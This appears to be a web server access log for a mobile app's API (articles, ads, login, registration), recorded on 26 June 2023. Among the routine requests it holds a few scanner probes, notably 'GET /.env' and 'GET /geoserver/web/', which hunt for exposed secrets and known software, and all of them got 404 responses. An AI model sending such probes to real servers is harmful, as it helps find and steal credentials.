::ffff:127.0.0.1 - - [26/Jun/2023:04:52:20 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [26/Jun/2023:04:52:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [26/Jun/2023:04:54:26 +0000] "GET /api/v1/articles/642d56517c1330814fb7635e? HTTP/1.0" 200 16235 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:54:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:56:05 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:04:56:37 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:56:51 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:58:58 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:58:58 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:04:58:59 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:58:59 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:59:00 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:59:00 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:59:09 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:00:17 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:00:17 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:00:17 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:05:04:16 +0000] "GET /api/v1/articles/642d581c7c1330814fb76387? HTTP/1.0" 200 7596 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:08:03 +0000] "GET /api/v1/articles/642d5b327c1330814fb763a4? HTTP/1.0" 200 9617 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:08:23 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:08:23 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:08:23 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:08:26 +0000] "GET /api/v1/articles/642d789c7c1330814fb763e7? HTTP/1.0" 200 6163 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:08:41 +0000] "GET /api/v1/articles/642d581c7c1330814fb76387? HTTP/1.0" 200 7596 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:10:38 +0000] "GET /api/v1/articles/646082bca32e8316d822e594? HTTP/1.0" 200 6579 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:10:54 +0000] "GET /api/v1/articles/647563dfa32e8316d824bc1b? HTTP/1.0" 200 4780 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:11:10 +0000] "GET /api/v1/articles/64816c33a32e8316d82604d8? HTTP/1.0" 200 5761 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:11:44 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
::ffff:127.0.0.1 - - [26/Jun/2023:05:12:14 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:12:39 +0000] "GET /geoserver/web/ HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
::1 - - [26/Jun/2023:05:13:58 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:14:19 +0000] "GET /api/v1/articles/642e44a97c1330814fb764fe? HTTP/1.0" 200 8047 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:15:01 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 200 22271 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:30:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:30:28 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:30:28 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:30:38 +0000] "GET /api/v1/articles/642d4ce07c1330814fb762a6? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:05:31:44 +0000] "GET /api/v1/articles/642d56517c1330814fb7635e? HTTP/1.0" 200 16235 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:39:06 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:40:45 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "-"
::1 - - [26/Jun/2023:05:40:48 +0000] "GET /sitemap.xml HTTP/1.0" 404 150 "-" "-"
::ffff:127.0.0.1 - - [26/Jun/2023:05:40:49 +0000] "GET /.well-known/security.txt HTTP/1.0" 404 163 "-" "-"
::1 - - [26/Jun/2023:05:40:50 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
::ffff:127.0.0.1 - - [26/Jun/2023:05:46:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:05:46:29 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:46:29 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:05:47:35 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:05:47:36 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:47:36 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:05:48:01 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:48:31 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:05:48:40 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:05:48:52 +0000] "POST /api/v1/users/register HTTP/1.0" 200 464 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
